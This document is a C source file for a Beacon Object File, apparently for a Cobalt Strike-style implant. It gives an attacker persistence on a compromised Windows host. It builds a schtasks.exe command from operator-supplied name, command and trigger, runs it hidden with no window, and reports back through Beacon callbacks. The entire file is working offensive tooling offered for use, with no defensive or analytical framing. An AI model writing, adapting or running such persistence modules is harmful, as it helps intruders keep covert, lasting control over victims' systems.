/*
 * BOF: Scheduled Task Persistence
 *
 * Creates a scheduled task for persistence. Uses CreateProcessW to invoke
 * schtasks.exe, which avoids the complexity of the COM ITaskService interface
 * while keeping the BOF compact.
 *
 * Compile: x86_64-w64-mingw32-gcc -c schtask.c -o schtask.o
 *
 * Arguments (packed via BeaconDataParse):
 *   [wchar*] task_name - name for the scheduled task
 *   [wchar*] command   - command / binary path to execute
 *   [wchar*] trigger   - trigger type: "ONLOGON", "DAILY", "ONSTART", "ONIDLE"
 */

#include <windows.h>
#include "../bof_api.h"

DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

DECLSPEC_IMPORT int __cdecl MSVCRT$_snwprintf(wchar_t *, size_t, const wchar_t *, ...);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    wchar_t *task_name = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *command   = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *trigger   = (wchar_t *)BeaconDataExtract(&parser, NULL);

    if (!task_name || !command || !trigger) {
        BeaconPrintf(CALLBACK_ERROR,
            "Usage: schtask <task_name> <command> <trigger>\n"
            "  Triggers: ONLOGON, DAILY, ONSTART, ONIDLE");
        return;
    }

    /*
     * Build: schtasks /Create /SC <trigger> /TN <name> /TR <cmd> /F
     * /F forces overwrite if the task already exists.
     */
    wchar_t cmdline[2048];
    MSVCRT$_snwprintf(cmdline, sizeof(cmdline) / sizeof(wchar_t),
        L"C:\\Windows\\System32\\schtasks.exe /Create /SC %s /TN \"%s\" /TR \"%s\" /F",
        trigger, task_name, command);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating scheduled task '%S'", task_name);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Trigger: %S", trigger);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Command: %S", command);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    for (int i = 0; i < (int)sizeof(si); i++) ((char *)&si)[i] = 0;
    for (int i = 0; i < (int)sizeof(pi); i++) ((char *)&pi)[i] = 0;
    si.cb = sizeof(si);

    if (!KERNEL32$CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessW failed: %lu", KERNEL32$GetLastError());
        return;
    }

    KERNEL32$WaitForSingleObject(pi.hProcess, 15000);

    DWORD exitCode = 1;
    KERNEL32$GetExitCodeProcess(pi.hProcess, &exitCode);

    if (exitCode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Task '%S' created successfully", task_name);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "schtasks.exe exited with code %lu", exitCode);
    }

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
}
